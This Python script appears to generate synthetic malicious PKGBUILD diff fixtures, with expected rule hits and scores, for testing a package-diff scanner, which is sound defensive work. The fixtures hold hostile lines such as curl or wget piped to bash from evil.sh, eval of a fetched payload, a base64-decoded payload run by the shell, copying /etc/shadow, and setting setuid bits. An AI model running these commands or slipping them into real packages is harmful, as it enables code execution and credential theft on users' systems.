"""Generate malicious synthetic fixtures + expected.json.

Usage:
    python scripts/gen_malicious_fixtures.py [--out tests/fixtures/malicious/synthetic]
"""

import argparse
import json
import re
import sys
from pathlib import Path

from trustsight.analysis import scan_diff
from trustsight.config import ensure_default_configs, load_config
from trustsight.rules import load_rules


FIXTURES: list[dict] = []


def add(name: str, diff_text: str, **expect):
    FIXTURES.append({
        "name": name,
        "diff_text": diff_text,
        "expect": expect,
    })


# ── Header template ──────────────────────────────────────────────────────────

def header(pkgname="malicious-pkg", func="build"):
    return f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
-pkgname={pkgname}
+pkgname={pkgname}
 pkgver=1.0
+"""


# ── R001: curl|bash variants ─────────────────────────────────────────────────

add("R001-curl-pipe-bash",
    header() + "curl https://evil.sh | bash\n",
    must_fire=["R001"], min_score=40, max_score=70)

add("R001-curl-pipe-sh",
    header() + "curl https://evil.sh | sh\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-dash",
    header() + "curl -s https://evil.sh | dash\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-zsh",
    header() + "curl -f https://evil.sh | zsh\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-source-stdin",
    header() + "curl https://evil.sh | source /dev/stdin\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-python",
    header() + "curl -sS https://evil.py | python\n",
    must_fire=["R001"], min_score=40)

add("R001-wget-pipe-bash",
    header() + "wget -qO- https://evil.sh | bash\n",
    must_fire=["R002"], min_score=40)

add("R001-wget-pipe-sh",
    header() + "wget https://evil.sh | sh\n",
    must_fire=["R002"], min_score=40)

# ── R003: base64 decode ──────────────────────────────────────────────────────

add("R003-base64-decode-bash",
    header() + "echo 'bWFsb2Npb3Vz' | base64 -d | bash\n",
    must_fire=["R003"], min_score=40)

add("R003-base64-decode-sh",
    header() + "base64 --decode <<< 'bWFsb2Npb3Vz' | sh\n",
    must_fire=["R003"], min_score=40)

# ── R004: SKIP checksum variants ─────────────────────────────────────────────

add("R004-skip-https-bare",
    header() + "sha256sums=('SKIP')\nsource=('https://example.com/pkg.tar.gz')\n",
    must_fire=["R004"], must_not_fire=["R012", "R013"], min_score=25)

add("R004-skip-https-named",
    header() + "sha256sums=('SKIP')\nsource=('https://github.com/user/repo/archive/v1.0.tar.gz')\n",
    must_fire=["R004"], must_not_fire=["R012", "R013"], min_score=25)

add("R004-skip-git-justified",
    header() + "sha256sums=('SKIP')\nsource=('git+https://github.com/user/repo.git')\n",
    must_fire=[], must_not_fire=["R004", "R012", "R013"])

add("R004-skip-git-pkgname",
    header(pkgname="evil-pkg-git") + "sha256sums=('SKIP')\nsource=('https://github.com/user/repo.git')\n",
    must_fire=[], must_not_fire=["R004", "R012", "R013"])

add("R004-skip-validpgpkeys",
    header() + "validpgpkeys=('DEADBEEF1234')\nsha256sums=('SKIP')\nsource=('https://example.com/pkg.tar.gz.asc')\n",
    must_fire=[], must_not_fire=["R004", "R012", "R013"])

add("R004-skip-indexed",
    header() + "sha256sums=('SKIP' 'deadbeef' 'cafebabe')\n",
    must_fire=["R004"], min_score=25)

# ── R005: empty checksum ─────────────────────────────────────────────────────

add("R005-empty-checksum",
    header() + "sha256sums=()\n",
    must_fire=["R005"], min_score=25)

# ── R006: http URL ───────────────────────────────────────────────────────────

add("R006-http-url",
    header() + "source=('http://example.com/pkg.tar.gz')\n",
    must_fire=["R006"], must_not_fire=["R012", "R013"], min_score=15)

add("R006-https-url",
    header() + "source=('https://example.com/pkg.tar.gz')\n",
    must_not_fire=["R006", "R012", "R013"])

# ── R007: .install modifications ─────────────────────────────────────────────

add("R007-install-added",
    header() + "install=malicious-pkg.install\n",
    must_fire=["R007"], min_score=15)

add("R007-install-modified",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=malicious-pkg
 pkgver=1.0
+install=malicious-pkg.install
""",
    must_fire=["R007"], min_score=15)

# ── R008: python/ruby -c with URL ────────────────────────────────────────────

add("R008-python-c-url",
    header() + "python -c https://evil.com/payload.py\n",
    must_fire=["R008"], min_score=25)

add("R008-ruby-e-url",
    header() + "ruby -c https://evil.com/payload.rb\n",
    must_fire=["R008"], min_score=25)

# ── R009: sudo ────────────────────────────────────────────────────────────────

add("R009-sudo-in-build",
    header() + "sudo cp /etc/shadow /tmp/out\n",
    must_fire=["R009"], min_score=40)

# ── R010: curl (not piped) ────────────────────────────────────────────────────

add("R010-curl-fetch",
    header() + "curl -O https://example.com/pkg.tar.gz\n",
    must_fire=["R010"], min_score=5)

# ── R011: wget (not piped) ────────────────────────────────────────────────────

add("R011-wget-fetch",
    header() + "wget https://example.com/pkg.tar.gz\n",
    must_fire=["R011"], min_score=5)

# ── R014: validpgpkeys added ─────────────────────────────────────────────────

add("R014-validpgpkeys-added",
    header() + "validpgpkeys=('DEADBEEF1234')\n",
    must_fire=["R014"], min_score=25)

# ── R015: depends added ──────────────────────────────────────────────────────

add("R015-depends-added",
    header() + "depends=('evil-pkg' 'another-pkg')\n",
    must_fire=["R015"], min_score=15)

# ── R016: makedepends/optdepends/checkdepends ────────────────────────────────

add("R016-makedepends-added",
    header() + "makedepends=('go' 'nodejs')\n",
    must_fire=["R016"], min_score=10)

add("R016-optdepends-added",
    header() + "optdepends=('evil-pkg: for the malicious feature')\n",
    must_fire=["R016"], min_score=10)

# ── R017: chmod +s ───────────────────────────────────────────────────────────

add("R017-chmod-suid",
    header() + "chmod +s /usr/bin/elevate\n",
    must_fire=["R017"], min_score=25)

add("R017-chmod-sgid",
    header() + "chmod g+s /usr/bin/elevate\n",
    must_fire=["R017"], min_score=25)

# ── R018: ln -sf ──────────────────────────────────────────────────────────────

add("R018-ln-sf",
    header() + "ln -sf /usr/bin/elevate /usr/local/bin/normal\n",
    must_fire=["R018"], min_score=15)

# ── R019: suspicious environment variable ────────────────────────────────────

add("R019-cflags-suspicious",
    header() + 'CFLAGS="-O2 -funroll-loops -march=native -fomit-frame-pointer"\n',
    must_fire=["R019"], min_score=10)

# ── R025: eval/exec ───────────────────────────────────────────────────────────

add("R025-eval",
    header() + 'eval "$(curl -s https://evil.com/payload)"\n',
    must_fire=["R025", "R010"], min_score=30)

add("R025-exec",
    header() + 'exec "$(wget -qO- https://evil.com/payload)"\n',
    must_fire=["R025", "R011"], min_score=30)

# ── R026: checksum changed to SKIP ───────────────────────────────────────────

add("R026-checksum-to-skip",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=malicious-pkg
 pkgver=1.0
-sha256sums=('deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe1234')
+sha256sums=('SKIP')
""",
    must_fire=["R026"], min_score=25)

# ── R027: checksum array emptied ─────────────────────────────────────────────

add("R027-checksum-emptied",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=malicious-pkg
 pkgver=1.0
-sha256sums=('deadbeef')
+sha256sums=()
""",
    must_fire=["R027"], min_score=25)


# ── Controls ─────────────────────────────────────────────────────────────────

add("control-benign-version-bump",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
 pkgname=benign-pkg
-pkgver=1.0
+pkgver=1.1
""",
    must_fire=[], must_not_fire=["R001", "R002", "R003", "R004", "R005",
                                  "R006", "R007", "R008", "R009", "R012",
                                  "R013", "R025", "R026", "R027"])


def main():
    parser = argparse.ArgumentParser(description="Generate malicious synthetic fixtures")
    parser.add_argument("--out", type=Path,
                        default=Path(__file__).resolve().parent.parent
                        / "tests" / "fixtures" / "malicious" / "synthetic")
    args = parser.parse_args()

    ensure_default_configs()
    config = load_config()
    rules = load_rules()

    args.out.mkdir(parents=True, exist_ok=True)

    # Clear existing non-injection fixtures (keep R012/R013 ones)
    for f in list(args.out.glob("*.diff")):
        if not f.name.startswith("R01") and not f.name.startswith("control"):
            f.unlink()

    expected = {}
    failures = []

    for fx in FIXTURES:
        fname = fx["name"] + ".diff"
        fpath = args.out / fname

        fpath.write_text(fx["diff_text"])

        try:
            fact = scan_diff(fx["diff_text"], rules=rules, config=config)
        except Exception as exc:
            failures.append(f"{fname}: scan_diff raised: {exc}")
            continue

        fired = {e.rule_id for e in fact.score_breakdown}
        must = set(fx["expect"].get("must_fire", []))
        must_not = set(fx["expect"].get("must_not_fire", []))
        min_s = fx["expect"].get("min_score", 0)
        max_s = fx["expect"].get("max_score", 100)

        missed = must - fired
        if missed:
            failures.append(f"{fname}: {missed} should fire, didn't. Fired: {fired}")
        fired_wrong = must_not & fired
        if fired_wrong:
            failures.append(f"{fname}: {fired_wrong} should NOT fire")
        if fact.final_score < min_s:
            failures.append(f"{fname}: score {fact.final_score} < {min_s}")
        if fact.final_score > max_s:
            failures.append(f"{fname}: score {fact.final_score} > {max_s}")

        entry = {}
        if must:
            entry["must_fire"] = sorted(must)
        if must_not:
            entry["must_not_fire"] = sorted(must_not)
        if min_s > 0:
            entry["min_score"] = min_s
        if max_s < 100:
            entry["max_score"] = max_s
        expected[fname] = entry

    # Merge with existing injection fixtures
    existing_exp = args.out / "expected.json"
    if existing_exp.exists():
        with open(existing_exp) as f:
            existing = json.load(f)
        for k, v in existing.items():
            if k not in expected:
                expected[k] = v

    with open(args.out / "expected.json", "w") as f:
        json.dump(expected, f, indent=2, ensure_ascii=False)
        f.write("\n")

    for fname in sorted(expected):
        print(f"  {fname}")

    if failures:
        print(f"\nFAILURES ({len(failures)}):", file=sys.stderr)
        for fb in failures:
            print(f"  {fb}", file=sys.stderr)
        sys.exit(1)
    else:
        print(f"\nAll {len(FIXTURES)} new fixtures pass validation. "
              f"Total synthetic fixtures: {len(expected)}")


if __name__ == "__main__":
    main()
